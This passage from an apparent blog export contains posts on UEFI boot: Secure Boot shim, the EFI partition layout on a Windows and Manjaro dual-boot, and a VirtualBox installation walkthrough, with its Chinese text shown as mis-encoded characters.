hardware debugging/OEMconfiguration tools) and Microsoft's Secure Boot certificates. Somesystems will allow editing the list of Secure Boot certificates throughfirmware settings (="BIOS settings"), but others won't. So anindependent solution was needed.</p><p>Microsoft offers an UEFI bootloader signing service for anyone, butat least initially the turnaround time for signing was quite long, sothe requirement to sign every version of GRUB directly would have causedunacceptable delays in bootloader updates. To solve the problem, theshim bootloader was developed: it's basically the simplest reasonableUEFI program that will add one or more certificates to the Secure Bootaccepted list. The simplicity will hopefully reduce the need to updatethe shim itself, so the open-source OS distributions (Linux and others)can just get their version of the shim signed by Microsoft just once andthen sign any version of GRUB with their own certificates, whose publicpart is embedded in the shim and allows Secure Boot accept thedistribution's version of GRUB.</p><p>Two similar terms are often used interchangeably, but in fact theyrefer to different things:</p><h2 id="boot-loaders-vs.-boot-managers">Boot Loaders vs. BootManagers</h2><ul><li><strong>Boot managers</strong> present a menu of boot options, orprovide some other way to control the boot process. The user can thenselect an option, and the boot manager passes control to the selectedtool.</li><li><strong>Boot loaders</strong> handle the task of loading an OSkernel into memory, often along with support files such as a Linuxinitial RAM disk (initrd) file, and starting the kernel running.</li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://unix.stackexchange.com/questions/565615/efi-boot-bootx64-efi-vs-efi-ubuntu-grubx64-efi-vs-boot-grub-x86-64-efi-grub-efi">EFI64.efivs EFI64.efi vs /boot/grub/x86_64-efi/grub.efi vs C:*</a></li><li><ahref="https://www.rodsbooks.com/efi-bootloaders/principles.html">ManagingEFI Boot Loaders for Linux:Basic Principles</a></li><li><ahref="https://en.wikipedia.org/wiki/EFI_system_partition&#39;">EFIsystem partition</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> efi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡åŒç³»ç»Ÿçœ‹ EFI</title>
      <link href="/blog/2020/09/30/os/efi_2sys/"/>
      <url>/blog/2020/09/30/os/efi_2sys/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…ç³»ç»Ÿå¯¹-uefi-å½±å“">å®‰è£…ç³»ç»Ÿå¯¹ UEFI å½±å“</h2><p>Bootloader path for a permanently installed OS</p><p>When an operating system is installed permanently to a UEFI system,there is one new step that absolutely did not exist on classic BIOS.When installing the bootloader, four things are written to the NVRAMmemory that holds the firmware settings:</p><ul><li>Bootloader pathname on the EFI System Partition (ESP) that holds thebootloader(s)</li><li>the GUID of the ESP partition</li><li>a descriptive (human-friendly) name for this particular bootloaderinstance</li><li>optionally, some data for the bootloader</li></ul><p>For Windows, the standard UEFI pathname for the Windows boot processwill be <code>\EFI\Microsoft\Boot\bootmgfw.efi</code>, and thedescriptive name will be "Windows Boot Manager". The optional data seemsto contain a GUID reference to something within the Windows bootloader'sBCD configuration file.</p><p>For Ubuntu, the pathname should be<code>\EFI\Ubuntu\grubx64.efi</code> if you don't need Secure Bootsupport, or <code>\EFI\Ubuntu\shimx64.efi</code> if the Secure Boot shimis used. The descriptive name is simply "ubuntu" and the optional datais not used.</p><p>In Ubuntu, these UEFI NVRAM boot settings can be viewed using the<code>sudo efibootmgr -v</code> command; in Windows, you can start aCommand Prompt <em>as Administrator</em> and then use the<code>bcdedit /enum firmware</code> command to view the settings.</p><p>The UEFI specification has a standard convention that each vendorshould place the bootloader for a permanently installed OS within thepath <code>\EFI\&lt;vendor name&gt;</code> on the ESP, so havingmultiple UEFI bootloaders co-exist on the same ESP is actually supportedand should make things easier than with classic BIOS that had a singleMaster Boot Record per disk.</p><h2 id="å¯åŠ¨è¿‡ç¨‹">å¯åŠ¨è¿‡ç¨‹</h2><h3 id="uefi-å¯åŠ¨æµç¨‹">UEFI å¯åŠ¨æµç¨‹</h3><ol type="1"><li><p>ç³»ç»Ÿå¼€æœº - ä¸Šç”µè‡ªæ£€ï¼ˆPower On Self Test æˆ– POSTï¼‰ã€‚</p></li><li><p>UEFI å›ºä»¶è¢«åŠ è½½ï¼Œå¹¶ç”±å®ƒåˆå§‹åŒ–å¯åŠ¨è¦ç”¨çš„ç¡¬ä»¶ã€‚</p></li><li><p>å›ºä»¶è¯»å–å…¶å¼•å¯¼ç®¡ç†å™¨ä»¥ç¡®å®šä»ä½•å¤„ï¼ˆæ¯”å¦‚ï¼Œä»å“ªä¸ªç¡¬ç›˜åŠåˆ†åŒºï¼‰åŠ è½½å“ªä¸ªUEFI åº”ç”¨ã€‚</p><p>The EFI firmware has its own "boot menu", analogous to the menupresented by GRUB but at an earlier stage in the boot process. Just asGRUB lets you choose which Linux kernel to run, the EFI boot menu letsyou choose which EFI boot program to run â€” choices being things likeGRUB itself, or the Windows bootloader. (And, like GRUB's menu, the EFIboot menu is typically not shown by default; you have to press a hotkeyduring startup to see it.)</p><p>The firmewire check the configuration data that's stored in themotherboard's NVRAM (the "BIOS settings" memory) for the entries in theEFI boot menu which are what we see in UEFI boot manager.</p><p>These NVRAM boot entries are (typically) created by operating systeminstallers. When you install an OS and it places a bootloader file inthe EFI system partition, it also adds an entry to the NVRAMconfiguration so that the new bootloader will be available in the EFIboot menu. (In many cases, it also makes that new entry the default, sothat the OS you've just installed will boot on its own without youneeding to open the EFI boot menu and manually choose it.)</p><p>Each entry holds a human-readable name (to show in the menu) and apath to a boot program in an EFI system partition, as well as a prioritynumber that determines which entry is booted by default when you don'tpress the hotkey to see the menu.</p></li><li><p>å›ºä»¶æŒ‰ç…§å¼•å¯¼ç®¡ç†å™¨ä¸­çš„å¯åŠ¨é¡¹ç›®ï¼ŒåŠ è½½ UEFI åº”ç”¨ã€‚</p><ol type="1"><li><p>å½“é€‰æ‹©ä»ç¡¬ç›˜å¯åŠ¨çš„æ—¶å€™ï¼Œä¸»æ¿ä¼šå»åŠ è½½ <code>\EFI\Boot</code>æ–‡ä»¶å¤¹ä¸‹çš„ <code>bootx64.efi</code>ã€‚</p><p>è¿™é‡Œå¯ä»¥åšä¸¤ä¸ªå®éªŒï¼š</p><ol type="1"><li><p>è®¾ç½® boot é»˜è®¤ä»ç¡¬ç›˜å¯åŠ¨</p><p>å°† <code>\EFI\Manjaro\grubx64.efi</code> å¤åˆ¶åˆ°<code>\EFI\Boot</code> é‡å‘½åä¸º <code>bootx64.efi</code>ï¼Œå¼€æœºè¿›å…¥çš„æ˜¯grub</p></li><li><p>è®¾ç½® boot é»˜è®¤ä»ç¡¬ç›˜å¯åŠ¨</p><p><code>\EFI\Microsoft\Boot\bootmgfw.efi</code> å¤åˆ¶åˆ°<code>\EFI\Boot</code> é‡å‘½åä¸º <code>bootx64.efi</code>ï¼Œå¼€æœºè¿›å…¥çš„æ˜¯windows</p></li></ol></li><li><p>å½“é€‰æ‹©ä» Windows å¯åŠ¨çš„æ—¶å€™ï¼Œä¸»æ¿ä¼šå»åŠ è½½<code>\EFI\Microsoft\Boot</code> æ–‡ä»¶å¤¹ä¸‹çš„<code>bootmgfw.efi</code>ã€‚</p><p>é€šè¿‡ <code>bootmgfw.efi</code> æ–‡ä»¶æ¥å¯¼å…¥è¯¥ç›®å½•ä¸‹ BCD æ–‡ä»¶ï¼Œç„¶å BCDæ–‡ä»¶æ ¹æ®è‡ªèº«çš„é…ç½®å†…å®¹åŠ è½½ç³»ç»Ÿå¼•å¯¼æ–‡ä»¶ <code>winload.efi</code>(å¯¹æ¯”legacy bios å¼•å¯¼å‘ç°ï¼ŒUEFI çš„å¼•å¯¼æ–‡ä»¶ <code>winload.efi</code>,è€Œ Legacyçš„å¼•å¯¼æ–‡ä»¶ä¸º <code>winload.exe</code>)</p></li><li><p>å½“é€‰æ‹©ä» Manjaro å¯åŠ¨çš„æ—¶å€™ï¼Œä¸»æ¿ä¼šå»åŠ è½½<code>\EFI\Manjaro</code> æ–‡ä»¶å¤¹ä¸‹çš„ <code>grubx64.efi</code>ï¼Œç„¶åè¿›å…¥grubã€‚è€Œ grubä¹Ÿæ˜¯ä¸€ä¸ªå¯åŠ¨ç®¡ç†å™¨ï¼Œå®ƒä¼šæ‰«æå¹¶å‘ˆç°æœ¬æœºçš„å¯ç”¨å¯åŠ¨é¡¹ä¾›ä½ é€‰æ‹©ã€‚</p></li></ol></li><li><p>å·²å¯åŠ¨çš„ UEFI åº”ç”¨è¿˜å¯ä»¥å¯åŠ¨å…¶ä»–åº”ç”¨ï¼ˆå¯¹åº”äº UEFI shell æˆ– rEFIndä¹‹ç±»çš„å¼•å¯¼ç®¡ç†å™¨çš„æƒ…å†µï¼‰æˆ–è€…å¯åŠ¨å†…æ ¸åŠ initramfsï¼ˆå¯¹åº”äº GRUBä¹‹ç±»å¼•å¯¼å™¨çš„æƒ…å†µï¼‰ï¼Œè¿™å–å†³äº UEFI åº”ç”¨çš„é…ç½®ã€‚</p></li></ol><h3 id="ç³»ç»Ÿå¼•å¯¼æµç¨‹">ç³»ç»Ÿå¼•å¯¼æµç¨‹</h3><p>æˆåŠŸå¼•å¯¼ç³»ç»Ÿï¼Œéœ€è¦å…·å¤‡ä»¥ä¸‹æ¡ä»¶ï¼š</p><ol type="1"><li>UEFI å›ºä»¶æ­£å¸¸</li><li>UEFI å¯åŠ¨é¡¹å¯¹åº”æ­£ç¡®çš„ <code>*.efi</code> æ–‡ä»¶</li><li>EFI åˆ†åŒºå­˜åœ¨</li><li>å¼•å¯¼å™¨ï¼ˆ<code>*.efi</code>ï¼‰åŠå…¶é…ç½®æ–‡ä»¶æ­£å¸¸</li><li>æ“ä½œç³»ç»Ÿç›¸å…³æ–‡ä»¶æ­£å¸¸</li></ol><p>æ»¡è¶³è¿™äº›æ¡ä»¶åï¼Œç³»ç»Ÿå¯åŠ¨çš„è¿‡ç¨‹å¤§è‡´æ˜¯ï¼šUEFI æ ¹æ® BootOrder åŠ è½½ EFIåˆ†åŒºä¸­çš„æŸä¸ªå¼•å¯¼å™¨(<code>grubx64.efi</code>)ï¼Œå¼•å¯¼å™¨åŠ è½½é…ç½®æ–‡ä»¶(<code>grub.cfg</code>)å‘ˆç°å¯åŠ¨èœå•(GRUBèœå•)ï¼Œç”¨æˆ·é€‰æ‹©å¯åŠ¨é¡¹åå¼•å¯¼å™¨åŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸ã€‚</p><p>è£…å®ŒåŒç³»ç»Ÿä¹‹åï¼Œåœ¨ UEFI ç•Œé¢çš„ Boot Manageré€‰é¡¹é‚£é‡Œä¹Ÿä¼šæ·»åŠ å¯¹åº”çš„å¯åŠ¨é¡¹ï¼Œå¦‚ä¹‹å‰çš„å›¾æ‰€ç¤ºã€‚</p><p>é€šè¿‡ easy uefi æŸ¥çœ‹è¿™äº›å¯åŠ¨é¡¹æŒ‡å‘çš„æ–‡ä»¶ï¼ˆHarddiské¡¹ä¸ºç©ºï¼Œå› æ­¤æ²¡æˆªå›¾ï¼‰ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929155837.png"alt="easy_uefi" /><figcaption aria-hidden="true">easy_uefi</figcaption></figure><h2 id="æµ‹è¯•ä¸ç°è±¡">æµ‹è¯•ä¸ç°è±¡</h2><p>ä¸‹é¢é¦–å…ˆçœ‹ä¸€ä¸‹å•/åŒç³»ç»Ÿçš„ EFIç›®å½•ç»“æœä»¥åŠä¸€äº›ç°è±¡ï¼Œåé¢åœ¨å¯åŠ¨è¿‡ç¨‹è¯¦ç»†è®²è¿°å¦‚ä½•å¯åŠ¨ã€‚</p><h3 id="windows-å•ç³»ç»Ÿ">Windows å•ç³»ç»Ÿ</h3><p>Windows å¯åŠ¨è¿‡ç¨‹ä¸­æœ‰ä¸€è¡Œï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928213712.png"alt="startup" /><figcaption aria-hidden="true">startup</figcaption></figure><p>è¯´æ˜å®ƒæ˜¯æ ¹æ® <code>bootmgfw.efi</code> å¼•å¯¼çš„ã€‚</p><h4 id="efi-ç»“æ„">EFI ç»“æ„</h4><p>Boot æ˜¯è®¡ç®—æœºé»˜è®¤å¼•å¯¼æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼ŒMicrosoft æ˜¯å¾®è½¯ Windowsç³»ç»Ÿå¼•å¯¼æ‰€åœ¨çš„ç›®å½•ã€‚<code>bootmgfw.efi</code> å°±æ˜¯ windowsé»˜è®¤çš„ç³»ç»Ÿå¼•å¯¼æ–‡ä»¶</p><p><code>\EFI\Boot</code> æ–‡ä»¶å¤¹ï¼š <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928211725.png"alt="Boot" /></p><p><code>\EFI\Microsoft\Boot</code> æ–‡ä»¶å¤¹ï¼š <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928211833.png"alt="Microsoft" /></p><p>å¯¹æ¯” <code>\EFI\Boot</code> æ–‡ä»¶å¤¹ä¸‹çš„ <code>bootx64.efi</code> ä¸<code>\EFI\Microsoft\Boot</code> æ–‡ä»¶å¤¹ä¸‹çš„ <code>bootmgfw.efi</code> çš„SHA1ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928212106.png"alt="sha1sum" /><figcaption aria-hidden="true">sha1sum</figcaption></figure><p>å‘ç°äºŒè€…çš„ SHA1 å€¼ç›¸åŒã€‚</p><h3 id="åŒç³»ç»Ÿ">åŒç³»ç»Ÿ</h3><h4 id="uefi-çš„-boot-manager-ç•Œé¢">UEFI çš„ Boot Manager ç•Œé¢</h4><p>å®‰è£… Manjaro GNOME Linux ä¹‹åï¼ŒæŸ¥çœ‹ UEFI çš„ Boot Manager ç•Œé¢ï¼š</p><ol type="1"><li><p>Manjaro å¯åŠ¨ä½¿ç”¨çš„æ˜¯<code>grubx64.efi</code> å¼•å¯¼</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929100448.png"alt="Manjaro" /><figcaption aria-hidden="true">Manjaro</figcaption></figure></li><li><p>Windows å¯åŠ¨ä½¿ç”¨ <code>bootmgfw.efi</code> å¼•å¯¼</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929100607.png"alt="Windows" /><figcaption aria-hidden="true">Windows</figcaption></figure></li><li><p>ç¡¬ç›˜å¯åŠ¨ï¼Œå‘ç°ä½¿ç”¨ Manjaro çš„ Grub ç•Œé¢</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929101035.png"alt="harddisk" /><figcaption aria-hidden="true">harddisk</figcaption></figure><p>ä»ç¡¬ç›˜å¯åŠ¨ï¼Œèµ°çš„æ˜¯<code>\EFI\Boot\bootx64.efi</code>ï¼Œ<code>\EFI\Boot\bootx64.efi</code>æŒ‡å‘å“ªä¸ªç³»ç»Ÿå°±èµ°å“ªä¸ªç³»ç»Ÿï¼ˆwin æˆ–è€…Linuxï¼‰ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯ä½ æŠŠå“ªä¸ªç³»ç»Ÿçš„å¼•å¯¼ï¼ˆ<code>bootmgfw.efi</code>æˆ–<code>grubx64.efi</code>ï¼‰å¤åˆ¶åˆ°è¿™é‡Œï¼Œé‡å‘½åä¸º<code>bootx64.efi</code>ï¼Œå®ƒå°±æ˜¯å¯¹åº”ç³»ç»Ÿçš„å¼•å¯¼ã€‚</p></li></ol><p>é€šè¿‡ DiskGenius æŸ¥çœ‹ä¸‰è€…çš„å¼•å¯¼ï¼š</p><p>å¯¹æ¯” <code>\EFI\Boot</code> æ–‡ä»¶å¤¹ä¸‹çš„ <code>bootx64.efi</code> ã€<code>\EFI\Microsoft\Boot</code> æ–‡ä»¶å¤¹ä¸‹çš„<code>bootmgfw.efi</code>ã€<code>\EFI\Manjaro</code> æ–‡ä»¶å¤¹ä¸‹çš„<code>grubx64.efi</code>çš„ SHA1ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929111326.png"alt="sha1" /><figcaption aria-hidden="true">sha1</figcaption></figure><p>å‘ç° <code>bootx64.efi</code> å’Œ <code>grubx64.efi</code> çš„ SHA1å€¼ç›¸åŒã€‚</p><blockquote><p>è¡¥å……ï¼š æœ‰æ—¶å€™ä¼šçœ‹åˆ° shimx64.efiï¼Œ å®ƒæ˜¯ shim å¼•å¯¼ç¨‹åºï¼ˆshimç”¨äºå®‰å…¨å¯åŠ¨ Secure Bootï¼Œè°ƒç”¨ grubï¼‰ã€‚ä¸€èˆ¬å®‰è£… Linux çš„ç”µè„‘ä¼šå…³é—­Secure Bootï¼Œè¿™æ · grubx64.efi å’Œ shimx64.efi å°±æ²¡ä»€ä¹ˆåŒºåˆ«äº†ã€‚</p></blockquote><h4 id="æŸ¥çœ‹-efi-ç›®å½•ç»“æ„">æŸ¥çœ‹ EFI ç›®å½•ç»“æ„</h4><ol type="1"><li><p><code>\EFI\Booot</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929163506.png"alt="boot" /><figcaption aria-hidden="true">boot</figcaption></figure></li><li><p><code>\EFI\Manjaro</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929163543.png"alt="manjaro" /><figcaption aria-hidden="true">manjaro</figcaption></figure></li><li><p><code>\EFI\Microsoft\Boot</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929163623.png"alt="Microsoft" /><figcaption aria-hidden="true">Microsoft</figcaption></figure></li></ol><p>æ“ä½œç³»ç»Ÿå®‰è£…å™¨ä¼šåˆ›å»º <code>\EFI&lt;distro&gt;</code>ç›®å½•ï¼ŒæŠŠå¼•å¯¼ç¨‹åº(<code>grubx64.efi</code>)æ”¾å…¥å…¶ä¸­ï¼Œç„¶ååœ¨ UEFIå¯åŠ¨ç®¡ç†å™¨ä¸­åˆ›å»ºå…¥å£ç‚¹ï¼ˆå¼€æœºä¸åœæŒ‰ ESC é”®è¿›å…¥ UEFI ç®¡ç†é¢æ¿ï¼‰ã€‚</p><p>Windows å®‰è£…æ—¶ä¼šé¦–å…ˆåˆ›å»ºè‡ªå·±çš„ç›®å½•<code>\EFI\Microsoft\Boot</code>ï¼Œå¹¶åœ¨é‡Œé¢æ”¾ç½®<code>bootmgfw.efi</code>ï¼Œ ç„¶åå†æŠŠ <code>bootmgfw.efi</code> æ‹·ä¸€ä»½åˆ°<code>\EFI\Boot</code> é‡Œå¹¶å‘½åæˆ<code>bootx64.efi</code>ï¼Œè¿™æ ·ç³»ç»Ÿç¼ºçœå°±ä» windows å¯åŠ¨äº†ã€‚</p><p>å®‰è£… manjaro çš„æ—¶å€™, manjaro ä¹Ÿä¼šåˆ›å»º <code>\EFI\Manjaro</code>ç›®å½•ï¼Œå¹¶æ”¾ä¸€ä¸ª <code>grubx64.efi</code>ï¼Œç„¶åå†æŠŠ<code>grubx64.efi</code> æ‹·ä¸€ä»½åˆ° <code>\EFI\Boot</code> é‡Œå¹¶å‘½åæˆ<code>bootx64.efi</code>ï¼Œå› æ­¤æˆ‘ä»¬å…ˆå®‰è£… Windows å†å®‰è£…Manjaroï¼Œå¼€æœºå¯åŠ¨çœ‹åˆ°çš„ç›´æ¥å°±æ˜¯ grub ç•Œé¢ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://wiki.archlinux.org/index.php/EFI_system_partition">EFIsystem partition</a></li><li><a href="https://www.jianshu.com/p/7821027cc455">Linux UEFIä¸å¤‡ä»½è¿˜åŸ(å¼•å¯¼ä¿®å¤)</a></li><li><a href="https://www.cnblogs.com/feipeng8848/p/10723661.html">EFIç³»ç»Ÿå¼•å¯¼çš„ä¸€äº›é›¶ç¢çŸ¥è¯†ç‚¹</a></li><li><ahref="https://blog.csdn.net/li_qing_xue/article/details/79228867#commentBox">Win10+UbuntuåŒç³»ç»Ÿï¼šUEFI+GPT å’Œ Legacy+MBR å¼•å¯¼æ¨¡å¼</a></li><li><ahref="https://unix.stackexchange.com/questions/160500/how-do-multiple-boot-loaders-work-on-an-efi-system-partition">Howdo multiple boot loaders work on an EFI system partition</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> efi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UEFI+GPT win+manjaro åŒç³»ç»Ÿå®‰è£…</title>
      <link href="/blog/2020/09/29/linux/manjaro/manjaro_install/"/>
      <url>/blog/2020/09/29/linux/manjaro/manjaro_install/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆå®‰è£…å¥½ Windows ç³»ç»Ÿï¼Œè¿™å„¿å°±ä¸è¯´äº†ã€‚</p><h2 id="æœ€åˆçœ‹çš„å®‰è£…æ•™ç¨‹">æœ€åˆçœ‹çš„å®‰è£…æ•™ç¨‹</h2><p><a href="https://www.bilibili.com/s/video/BV1eJ411P7NF">UEFI å®‰è£…Win10+Manjaro-Linux åŒç³»ç»Ÿ</a></p><h2 id="windows">Windows</h2><p>é‡åˆ°çš„é—®é¢˜ï¼š</p><ol type="1"><li><p>Windows åŸç‰ˆé•œåƒå®‰è£…æ—¶æŠ¥é”™ Virtualbox ä½¿ç”¨ç™¾åº¦ç½‘ç›˜ç¦»çº¿ä¸‹è½½çš„ MSDNItellyou çš„é•œåƒæ€»æ˜¯æŠ¥é”™ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯æ²¡ä¸‹å®Œæ•´ï¼Œåæ¥åˆä¸‹è½½äº†ä¸€æ¬¡æ— æ•ˆã€‚</p><p>ä½¿ç”¨<ahref="https://www.52pojie.cn/thread-733425-1-1.html">ä¿„ç½—æ–¯ç‹‚äººç²¾ç®€çš„win10 ä¸“ä¸šç‰ˆç³»ç»Ÿ</a></p></li><li><p>Virtualbox é»˜è®¤ä¸æ”¯æŒ USB 3.0 å®‰è£…æ‰©å±•</p><p>å…ˆå‘½ä»¤è¡Œå®‰è£…å¯¹åº”ç‰ˆæœ¬ï¼Œç„¶ååœ¨ File-&gt;Preference-&gt;Extensionä¸­åŠ è½½ä¸‹è½½çš„æ–‡ä»¶ è·¯å¾„æˆ‘å½“æ—¶æ˜¯ä½¿ç”¨ find å‘½ä»¤æ‰¾çš„ï¼Œå¤§è‡´åœ¨<code>/usr/share/virtualbox/extensions</code></p><p>https://wiki.manjaro.org/index.php?title=VirtualBox</p></li><li><p>Virtualbox é»˜è®¤ä½¿ç”¨ legacy bios,éœ€è¦æ›´æ”¹ä¸º EFI</p><p><code>Mechine-&gt;Settings-&gt;System</code> é¢æ¿çš„<code>Enable EFI(spectial OSes only)</code></p><blockquote><p>æ³¨ï¼šè¯¥é¡¹å‘¨å›´çš„ä¸‰ä¸ªéƒ½å¯ä»¥å‹¾é€‰ä¸Š</p></blockquote></li><li><p>Vbox å…±äº«æ–‡ä»¶å¤¹è®¾ç½®</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929105210.png"alt="shared_folder" /><figcaption aria-hidden="true">shared_folder</figcaption></figure><p>æ³¨æ„ï¼šå‹¾é€‰ Auto-mount è‡ªåŠ¨æŒ‚è½½ï¼ˆå¦åˆ™ä½ è¿˜è¦å»æ‰‹åŠ¨æŒ‚è½½ï¼‰ï¼ŒMaekPermanent æ°¸ä¹…å…±äº«ï¼ˆå¦åˆ™é‡å¯ä¹‹ååˆæ²¡äº†ï¼Œè¿˜éœ€è¦å†æ¬¡è®¾ç½®ï¼‰</p></li></ol><h2 id="manjaro-gnome">Manjaro Gnome</h2><p>é¦–å…ˆï¼Œä¸‹è½½å¥½ iso é•œåƒæ–‡ä»¶ï¼Œç„¶ååœ¨ win10 è™šæ‹Ÿæœºï¼Œå³é”®<code>Settings-&gt;Storage</code>, å¢åŠ  manjaro linux çš„ISO,ç„¶åé€‰æ‹©å°†å…¶ä½œä¸º Live CD/DVD åŠ è½½ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928213923.png"alt="configuration" /><figcaption aria-hidden="true">configuration</figcaption></figure><p>å¯åŠ¨ win10,ç„¶åä¸åœåœ°æŒ‰ <code>Esc</code> è¿›å…¥ UEFI,é€‰æ‹©<code>Boot Manager</code>ï¼Œå›è½¦</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214421.png"alt="Boot Manager" /><figcaption aria-hidden="true">Boot Manager</figcaption></figure><p>ç„¶åé€‰æ‹©ç¬¬äºŒä¸ª CD/ROMï¼Œ ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ Manjaro GNOME CD/DVD:</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214534.png"alt="20200928214534" /><figcaption aria-hidden="true">20200928214534</figcaption></figure><p>é©±åŠ¨æ”¹æˆé—­æºé©±åŠ¨: no-free ï¼Œç„¶åå›è½¦ï¼Œç­‰å¾…å¯åŠ¨</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214614.png"alt="manajro_start" /><figcaption aria-hidden="true">manajro_start</figcaption></figure><p>å¯åŠ¨ä¹‹åï¼Œç‚¹å‡» Install launcherï¼Œç„¶åå®‰è£…ï¼š</p><p>å…¶ä¸­ï¼Œä»¥ä¸‹ç•Œé¢ï¼Œå¯ä»¥éªŒè¯æˆ‘ä»¬æ˜¯ EFI+GPT, å¹¶ä¸”æˆ‘ä»¬é€‰æ‹©<code>Manual partitioning</code>ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214822.png"alt="20200928214822" /><figcaption aria-hidden="true">20200928214822</figcaption></figure><h3 id="åˆ†åŒº">åˆ†åŒº</h3><p>æˆ‘æ˜¯ç›´æ¥å°† manjaro æŒ‚è½½åœ¨ windows çš„ 100m çš„ EFI åˆ†åŒºä¸Šçš„</p><ol type="1"><li><p>åˆ†åŒº</p><ol type="1"><li><p>EFI åˆ†åŒº</p><p>ç›´æ¥æ‰“å¼€ Windows çš„ 100M EFI åˆ†åŒºï¼Œæ–‡ä»¶ç³»ç»Ÿfat32ï¼Œå†…å®¹ï¼š<strong>keepï¼ˆä¿ç•™ï¼‰</strong>ï¼ŒæŒ‚è½½ç‚¹<code>/boot/efi</code>ã€‚</p></li><li><p>æ ¹ç›®å½•</p><p>æŒ‚è½½ç‚¹ï¼š<code>/</code>ï¼Œæ–‡ä»¶ç³»ç»Ÿ <code>ext4</code></p><p>å­˜å‚¨ç³»ç»Ÿæ ¹ç”¨æˆ·çš„é…ç½®ä¿¡æ¯ä¸è½¯ä»¶ï¼Œç”±äº Manjaro çš„è½¯ä»¶å¸‚åœºé»˜è®¤æ˜¯å®‰è£…åœ¨éhome ä¸‹ï¼Œå› æ­¤å»ºè®®ç•™è¶³å¤Ÿçš„å¤§å°</p><ol type="1"><li><p><code>/var</code> ç›®å½•</p><p>å­˜å‚¨å˜é‡æ•°æ®ä¾‹å¦‚ spoolç›®å½•å’Œæ–‡ä»¶ï¼Œç®¡ç†å’Œç™»å½•æ•°æ®,å®ƒé€šå¸¸è¢«ç”¨ä½œç¼“å­˜æˆ–è€…æ—¥å¿—è®°å½•ï¼Œå› æ­¤è¯»å†™é¢‘ç¹ã€‚å°†å®ƒç‹¬ç«‹å‡ºæ¥å¯ä»¥é¿å…ç”±äºå¤§é‡æ—¥å¿—å†™å…¥é€ æˆçš„ç£ç›˜ç©ºé—´è€—å°½ç­‰é—®é¢˜ã€‚</p></li><li><p><code>/home</code></p><p>å°† <code>/home</code> ç›®å½•ç‹¬ç«‹ä½¿å¾— <code>/</code>åˆ†åŒºå¯ä»¥å•ç‹¬é‡æ–°åˆ’åˆ†ï¼Œä½†æ˜¯è¯·æ³¨æ„ä½ å¯ä»¥åœ¨ <code>/home</code>æ²¡æœ‰ç‹¬ç«‹åˆ†åŒºçš„æƒ…å†µä¸‹ä½ ä»ç„¶å¯ä»¥åœ¨ä¸ä¿®æ”¹ <code>/home</code>ç›®å½•å†…å®¹çš„æƒ…å†µä¸‹é‡è£… Manjaro Linux.</p></li></ol></li><li><p><code>swap</code>,æ–‡ä»¶ç³»ç»Ÿ <code>linuxswap</code></p><p>ä¸€èˆ¬å’Œä½ ç‰©ç†å†…å­˜å¤§å°ç›¸å½“ã€‚</p></li></ol><p>å…³äºåˆ†åŒºç•¥è¯¦ç»†çš„ä»‹ç»ï¼Œå¯ä»¥çœ‹<ahref="https://www.jianshu.com/p/f9413171cb11">7.Manjaroæ–‡ä»¶ç»“æ„å’Œåˆ†åŒºæ–¹æ¡ˆ</a></p></li><li><p>é‡è£…çš„æ—¶å€™ï¼Œåˆ é™¤ efi å¼•å¯¼ä»¥åŠæ ¼å¼åŒ–ç£ç›˜</p><p><a href="https://blog.csdn.net/mtllyb/article/details/78635757">åˆ é™¤efi å¼•å¯¼</a></p></li></ol><p>å½“ç„¶ï¼Œå»ºè®®ä½ ä¹Ÿç›´æ¥é‡æ–°åˆ†ä¸€ä¸ª 512 M çš„åŒºåŸŸç”¨æ¥å­˜æ”¾ Linuxçš„å¼•å¯¼ï¼Œè¿™æ ·é‡è£…ä¹Ÿæ–¹ä¾¿</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMTP åè®®</title>
      <link href="/blog/2020/09/14/network/smtp/"/>
      <url>/blog/2020/09/14/network/smtp/</url>
      
